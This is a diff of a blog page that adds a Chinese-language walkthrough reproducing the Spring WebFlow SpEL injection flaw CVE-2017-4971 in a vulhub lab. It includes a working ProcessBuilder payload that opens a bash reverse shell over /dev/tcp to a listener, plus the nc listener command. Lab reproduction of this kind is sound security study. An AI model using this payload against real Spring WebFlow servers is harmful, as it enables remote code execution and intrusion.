@@ -5,7 +5,8 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="Spring-WebFlow远程代码执行漏洞(CVE-2017-4971), Broken-year">
-    <meta name="description" content="">
+    <meta name="description" content="Spring-WebFlow远程代码执行漏洞漏洞简述
+Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -480,7 +481,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    249
                 </div>
                 
 
@@ -502,7 +503,43 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="Spring-WebFlow远程代码执行漏洞"><a href="#Spring-WebFlow远程代码执行漏洞" class="headerlink" title="Spring-WebFlow远程代码执行漏洞"></a>Spring-WebFlow远程代码执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote>
+<p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
+</blockquote>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote>
+<p>Spring WebFlow 2.4.0 - 2.4.4</p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2017-4971
+docker-compose up -d
+</code></pre>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开<code>http://192.168.3.151:8080</code></p>
+<p><img src="/2022/05/06/Spring-WebFlow/image-20220506170325448.png" alt="image-20220506170325448"></p>
+<p>点开<code>login</code></p>
+<p><img src="/2022/05/06/Spring-WebFlow/image-20220506170405556.png" alt="image-20220506170405556"></p>
+<p>在这里用他给的账号登录</p>
+<p>进入之后打开<code>http://192.168.3.151:8080/hotels/1</code></p>
+<p><img src="/2022/05/06/Spring-WebFlow/image-20220506170833403.png" alt="image-20220506170833403"></p>
+<p>预约</p>
+<p>输入信息后点击这个</p>
+<p><img src="/2022/05/06/Spring-WebFlow/image-20220506171056518.png" alt="image-20220506171056518"></p>
+<p>然后点击<code>Confirm</code></p>
+<p><img src="/2022/05/06/Spring-WebFlow/image-20220506171403884.png" alt="image-20220506171403884"></p>
+<p>抓包</p>
+<p><img src="/2022/05/06/Spring-WebFlow/image-20220506171423970.png" alt="image-20220506171423970"></p>
+<p>构造payload</p>
+<pre><code>&amp;_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/192.168.3.134/4444+0&gt;%261&quot;)).start()=vulhub
+</code></pre>
+<p>设置监听</p>
+<pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444
+</code></pre>
+<p><img src="/2022/05/06/Spring-WebFlow/image-20220506172837432.png" alt="image-20220506172837432"></p>
+<p>然后放行端口</p>
+<p><img src="/2022/05/06/Spring-WebFlow/image-20220506172851423.png" alt="image-20220506172851423"></p>
+<p>显示500</p>
+<p>连接成功！</p>
+<p><img src="/2022/05/06/Spring-WebFlow/image-20220506172919030.png" alt="image-20220506172919030"></p>
+<p>结束！！</p>
+
                 
             </div>
             <hr/>
@@ -1265,17 +1302,16 @@ $(function () {
     
 
     
-        
+
+    <!-- 雪花特效 -->
+     
         <script type="text/javascript">
             // 只在桌面版网页启用特效
             var windowWidth = $(window).width();
             if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
             }
         </script>
-    
-
-    <!-- 雪花特效 -->
     
 
     <!-- 鼠标星星特效 -->
